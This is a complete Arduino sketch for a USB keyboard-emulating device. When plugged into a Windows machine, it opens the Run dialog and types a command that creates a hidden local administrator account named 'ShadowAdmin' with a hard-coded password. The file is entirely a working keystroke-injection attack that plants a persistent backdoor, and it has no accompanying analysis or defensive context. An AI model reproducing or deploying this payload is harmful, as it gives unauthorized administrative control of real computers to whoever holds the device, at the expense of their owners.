#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println(F("cmd /c net user ShadowAdmin P@ssw0rd! /add /active:yes /passwordchg:no && net localgroup Administrators ShadowAdmin /add"));
}

void loop() {}
